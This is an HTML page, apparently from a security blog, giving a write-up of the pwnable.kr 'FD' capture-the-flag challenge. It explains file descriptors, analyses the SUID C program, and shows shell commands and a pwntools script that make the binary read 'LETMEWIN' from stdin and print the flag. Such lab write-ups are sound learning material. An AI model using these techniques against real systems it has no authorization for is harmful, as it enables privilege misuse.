@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="One of my objective in 2020 is to level up in Reverse Engineering. Since I am starting from zero I got few people recommend http:&#x2F;&#x2F;pwnable.kr which appear to have a reasonable curve of difficulty mak">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwnable.kr - FD">
+<meta property="og:url" content="https://hg8.sh/pwnable/fd/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="One of my objective in 2020 is to level up in Reverse Engineering. Since I am starting from zero I got few people recommend http:&#x2F;&#x2F;pwnable.kr which appear to have a reasonable curve of difficulty mak">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82187694-12e6ad00-98ed-11ea-88da-0c05f6fcb13f.png">
+<meta property="article:published_time" content="2020-05-02T22:00:00.000Z">
+<meta property="article:modified_time" content="2020-05-18T12:34:51.683Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="re">
+<meta property="article:tag" content="fd">
+<meta property="article:tag" content="file descriptor">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82187694-12e6ad00-98ed-11ea-88da-0c05f6fcb13f.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+     
+    <title>Pwnable.kr - FD :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/obscurity/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/openadmin/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://hg8.sh/pwnable/fd/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://hg8.sh/pwnable/fd/&text=Pwnable.kr - FD" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://hg8.sh/pwnable/fd/&title=Pwnable.kr - FD" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hg8.sh/pwnable/fd/&is_video=false&description=Pwnable.kr - FD" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Pwnable.kr - FD&body=Check out this article: https://hg8.sh/pwnable/fd/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://hg8.sh/pwnable/fd/&title=Pwnable.kr - FD" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://hg8.sh/pwnable/fd/&title=Pwnable.kr - FD" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://hg8.sh/pwnable/fd/&title=Pwnable.kr - FD" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://hg8.sh/pwnable/fd/&title=Pwnable.kr - FD" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://hg8.sh/pwnable/fd/&name=Pwnable.kr - FD&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://hg8.sh/pwnable/fd/&t=Pwnable.kr - FD" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Description"><span class="toc-number">1.</span> <span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-Descriptor"><span class="toc-number">2.</span> <span class="toc-text">File Descriptor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Source-Code-Analysis"><span class="toc-number">3.</span> <span class="toc-text">Source Code Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">4.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-1"><span class="toc-number">4.1.</span> <span class="toc-text">Method 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-2-Recommended"><span class="toc-number">4.2.</span> <span class="toc-text">Method 2 (Recommended)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation-with-pwntools"><span class="toc-number">5.</span> <span class="toc-text">Exploitation with pwntools</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.png);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+       
+        <li><a href="/tags/">Tags</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Pwnable.kr - FD
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2020-05-02T22:00:00.000Z" itemprop="datePublished">03-05-2020</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      5 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><img src="https://user-images.githubusercontent.com/9076747/82187694-12e6ad00-98ed-11ea-88da-0c05f6fcb13f.png" alt="fd"></p>
+<p>One of my objective in 2020 is to level up in Reverse Engineering. Since I am starting from zero I got few people recommend <a href="http://pwnable.kr" target="_blank" rel="noopener">http://pwnable.kr</a> which appear to have a reasonable curve of difficulty making it ideal for learning. </p>
+<p>If you have other recommandations for good ressources to learn and practices Reverse Engineering feels free to let me know below in a comment or <a href="https://hg8.sh/about/">contact me</a> ;)</p>
+<p>That being said, here is my write-up for the first challenge of pwnable.kr: FD. </p>
+<p>Let’s go!</p>
+<hr>
+<h2 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h2><blockquote>
+<p><strong>FD</strong></p>
+<p>Mommy! what is a file descriptor in Linux?<br>ssh <a href="mailto:fd@pwnable.kr">fd@pwnable.kr</a> -p2222 (pw:guest)</p>
+</blockquote>
+<p>This gives us an SSH access to a box with a hint that this challenge is going to be about File Descriptor</p>
+<h2 id="File-Descriptor"><a href="#File-Descriptor" class="headerlink" title="File Descriptor"></a>File Descriptor</h2><p>In Unix a file descriptor is abstract indicator (handle) used to access a file or other input/output resource. A file descriptor is a non-negative integer, generally represented in the C programming language as the type int.</p>
+<p>You are surely familiar with the three most common file descriptor:</p>
+<ul>
+<li>0 - stdin (Standard Input)</li>
+<li>1 -  stdout (Standard Output)</li>
+<li>2 - stderr (Standard Error)</li>
+</ul>
+<p>But file descriptor goes farther than that. To make it simple, file descriptor are used when you open a file.<br>When you do so, the OS will store the information about this file in a table entry. Theses table entries are represented with integers. The entry number is the file descriptor. </p>
+<h2 id="Source-Code-Analysis"><a href="#Source-Code-Analysis" class="headerlink" title="Source Code Analysis"></a>Source Code Analysis</h2><p>The first thing we notice when connecting to the box is that code source of the challenge is available:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh fd@pwnable.kr -p2222</span><br><span class="line">fd@pwnable.kr<span class="string">'s password:</span></span><br><span class="line"><span class="string"> ____  __    __  ____    ____  ____   _        ___      __  _  ____</span></span><br><span class="line"><span class="string">|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \</span></span><br><span class="line"><span class="string">|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  '</span> / |  D  )</span><br><span class="line">|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /</span><br><span class="line">|  |  |  `  <span class="string">'  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \</span></span><br><span class="line"><span class="string">|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \</span></span><br><span class="line"><span class="string">|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Sun May  3 10:21:23 2020 from 93.172.62.192</span></span><br><span class="line"><span class="string">fd@pwnable:~$ ls -l</span></span><br><span class="line"><span class="string">total 16</span></span><br><span class="line"><span class="string">-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root   root  418 Jun 11  2014 fd.c</span></span><br><span class="line"><span class="string">-r--r----- 1 fd_pwn root   50 Jun 11  2014 flag</span></span><br></pre></td></tr></table></figure>
+
+<p>Let’s a take a look to understand what it’s doing:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = <span class="built_in">read</span>(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Let’s break things down. The first information we get is that the app need an extra arguments in a form of a number:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>With the name of the challenge we can guess that is number will probably be a file descriptor. </p>
+<p>Next we -almost- have a confirmation of this theory. <code>0x1234</code> (<code>4660</code>) gets subtracted to integer we passed as argument to get the actual file descriptor:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br></pre></td></tr></table></figure>
+
+<p><em>Note: Here is a quick way to convert hexadecimal to decimal: <code>echo $((16#1234))</code></em></p>
+<p>Then the <code>read</code> function is used to, well, read the file pointed by the file descriptor and store the content in the <code>buf</code> variable:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">len = <span class="built_in">read</span>(fd, buf, <span class="number">32</span>);</span><br></pre></td></tr></table></figure>
+
+<p>The <code>buf</code> variable gets check to see if it contains the string <code>LETMEWIN\n</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br></pre></td></tr></table></figure>
+
+<p>If it does, then the program print out the flag:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">    system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>But you might wonder own the binary get print the flag since it’s owned by <code>root</code> ? It’s because the binary have the SUID bit set:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ ls -l fd</span><br><span class="line">-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd</span><br><span class="line">   ^</span><br></pre></td></tr></table></figure>
+
+<p>As a reminder:</p>
+<blockquote>
+<p>setuidis is a Unix access rights flag that allow users to run an executable with the permissions of the executable’s owner. They are often used to allow users to run programs with temporarily elevated privileges in order to perform a specific task. </p>
+</blockquote>
+<p>Thanks to this bit, the <code>fd</code> binary will run as with <code>root</code> privileges and will be allow to access the flag file.</p>
+<p>Alright I think we now have all the needed informations to get the flag right ? To summarize:</p>
+<ol>
+<li>Create a file containing <code>LETMEWIN\n</code></li>
+<li>Get the file descriptor of this file</li>
+<li>Subtract <code>4660</code> from this file descriptor</li>
+<li>Use this result as a command line argument: <code>./fd xxx</code></li>
+</ol>
+<p>Doesn’t look that scary. Let’s put it in practice now :) </p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h3><p>First, we create our file. Let’s use <code>printf</code> to make sure the newline gets included:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ <span class="built_in">printf</span> <span class="string">"LETMEWIN\n"</span> &gt; /tmp/.hg8</span><br><span class="line">fd@pwnable:~$ cat -e /tmp/.hg8</span><br><span class="line">LETMEWIN$</span><br></pre></td></tr></table></figure>
+
+<p>Then we need to assign a file descriptor to our newly created file. It’s possible to do so using <code>exec X &lt; filename</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ <span class="built_in">exec</span> 10&lt;/tmp/.hg8</span><br></pre></td></tr></table></figure>
+
+<p>Final step is to add <code>4660</code> to the file descriptor we chose and pass it as a argument to the <code>fd</code> binary:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ ./fd 4670</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>
+
+<h3 id="Method-2-Recommended"><a href="#Method-2-Recommended" class="headerlink" title="Method 2 (Recommended)"></a>Method 2 (Recommended)</h3><p>We also know that one of the most common file descriptor is <code>0</code> which correspond to the standard input. If we use <code>4660</code> as an argument, the binary will compare <code>LETMEWIN\n</code> to the content in the file descriptor <code>0</code> which is the standard input. If everything goes fine we should be able to directly write our “secret” code there. </p>
+<p>Let’s give it a try:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ ./fd 4660</span><br></pre></td></tr></table></figure>
+
+<p>We get a blank line with no error messages, let’s type <code>LETMEWIN</code> then enter:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploitation-with-pwntools"><a href="#Exploitation-with-pwntools" class="headerlink" title="Exploitation with pwntools"></a>Exploitation with pwntools</h2><p>A simple challenge like this one is a good occasion to try our hand on <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener"><code>pwntools</code></a> which can probably comes very useful in the future.</p>
+<blockquote>
+<p>Pwntools is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.</p>
+</blockquote>
+<p>After installing the tool let’s create a simple script to solve the challenge. </p>
+<p>First let’s connect to the server:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">server = ssh(<span class="string">'fd'</span>, <span class="string">'pwnable.kr'</span>, <span class="number">2222</span>, <span class="string">'guest'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>Pop a shell and run <code>./fd</code> process with <code>4660</code> as argument, and then send the <code>LETMEIN</code> secret:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell = server.process([<span class="string">'./fd'</span>, str(<span class="number">4660</span>)])</span><br><span class="line">shell.sendline(<span class="string">'LETMEWIN'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>After closing the connection and printing the result the final script looks like this:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">server = ssh(<span class="string">'fd'</span>, <span class="string">'pwnable.kr'</span>, <span class="number">2222</span>, <span class="string">'guest'</span>)</span><br><span class="line">shell = server.process([<span class="string">'./fd'</span>, str(<span class="number">4660</span>)])</span><br><span class="line">shell.sendline(<span class="string">'LETMEWIN'</span>)</span><br><span class="line">result = shell.recvall()</span><br><span class="line">shell.close()</span><br><span class="line">server.close()</span><br><span class="line"></span><br><span class="line">print(result.decode(<span class="string">"utf-8"</span>))</span><br></pre></td></tr></table></figure>
+
+<p>Running it:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python exploit.py</span><br><span class="line">[+] Connecting to pwnable.kr on port 2222: Done</span><br><span class="line">[*] fd@pwnable.kr:</span><br><span class="line">    Distro    Ubuntu 16.04</span><br><span class="line">    OS:       linux</span><br><span class="line">    Arch:     amd64</span><br><span class="line">    Version:  4.4.179</span><br><span class="line">    ASLR:     Enabled</span><br><span class="line">[+] Starting remote process <span class="string">'./fd'</span> on pwnable.kr: pid 266951</span><br><span class="line">[+] Receiving all data: Done (62B)</span><br><span class="line">[*] Stopped remote process <span class="string">'fd'</span> on pwnable.kr (pid 266951)</span><br><span class="line">[*] Closed connection to <span class="string">'pwnable.kr'</span></span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
+<p>See you next time ;)</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/pwnable/">pwnable</a> › <a class="category-link" href="/categories/CTF/pwnable/linux/">linux</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/fd/" rel="tag">fd</a>, <a class="tag-link" href="/tags/file-descriptor/" rel="tag">file descriptor</a>, <a class="tag-link" href="/tags/re/" rel="tag">re</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Description"><span class="toc-number">1.</span> <span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-Descriptor"><span class="toc-number">2.</span> <span class="toc-text">File Descriptor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Source-Code-Analysis"><span class="toc-number">3.</span> <span class="toc-text">Source Code Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">4.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-1"><span class="toc-number">4.1.</span> <span class="toc-text">Method 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-2-Recommended"><span class="toc-number">4.2.</span> <span class="toc-text">Method 2 (Recommended)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation-with-pwntools"><span class="toc-number">5.</span> <span class="toc-text">Exploitation with pwntools</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://hg8.sh/pwnable/fd/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://hg8.sh/pwnable/fd/&text=Pwnable.kr - FD" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://hg8.sh/pwnable/fd/&title=Pwnable.kr - FD" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hg8.sh/pwnable/fd/&is_video=false&description=Pwnable.kr - FD" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Pwnable.kr - FD&body=Check out this article: https://hg8.sh/pwnable/fd/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://hg8.sh/pwnable/fd/&title=Pwnable.kr - FD" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://hg8.sh/pwnable/fd/&title=Pwnable.kr - FD" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://hg8.sh/pwnable/fd/&title=Pwnable.kr - FD" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://hg8.sh/pwnable/fd/&title=Pwnable.kr - FD" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://hg8.sh/pwnable/fd/&name=Pwnable.kr - FD&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://hg8.sh/pwnable/fd/&t=Pwnable.kr - FD" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
